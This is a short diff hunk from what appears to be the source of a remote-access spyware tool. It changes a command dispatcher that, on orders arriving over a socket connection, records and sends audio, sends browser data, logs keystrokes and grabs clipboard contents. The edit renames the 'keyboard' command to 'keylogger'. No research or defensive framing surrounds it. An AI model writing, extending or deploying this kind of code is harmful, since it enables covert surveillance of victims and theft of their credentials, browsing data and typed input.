@@ -54,7 +54,7 @@ def command(data):
         record_and_send_audio(duration, sio)
     elif command == 'browserdata':
         send_browser_data(sio)
-    elif command == 'keyboard':
+    elif command == 'keylogger':
         record_and_send_keyboard_log(duration, sio)
     elif command == 'papier':
         get_clipboard_content(sio)
